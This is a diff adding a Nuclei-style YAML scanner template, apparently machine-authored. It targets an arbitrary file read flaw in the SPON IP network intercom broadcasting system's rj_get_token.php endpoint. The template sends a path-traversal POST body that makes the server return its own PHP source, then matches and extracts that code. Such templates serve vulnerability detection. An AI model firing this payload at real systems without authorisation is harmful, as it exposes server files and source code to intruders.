@@ -1,0 +1,36 @@
+id: poc-yaml-spon-php-rj-getjson-fileread
+
+info:
+  name: 世邦通信SPON IP网络对讲广播系统 rj_get_token.php 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Exploits a file read vulnerability in the SPON IP Network Intercom Broadcasting System's rj_get_token.php endpoint.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/php/rj_get_token.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      jsondata[url]=../php/rj_get_token.php
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?php"
+          - "$_POST"
+          - "$result"
+          - "file_get_contents("
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<\\?php.*\\?>"  # Extract PHP code blocks
+          - "\\$result = .*;" # Extract result variable assignments.
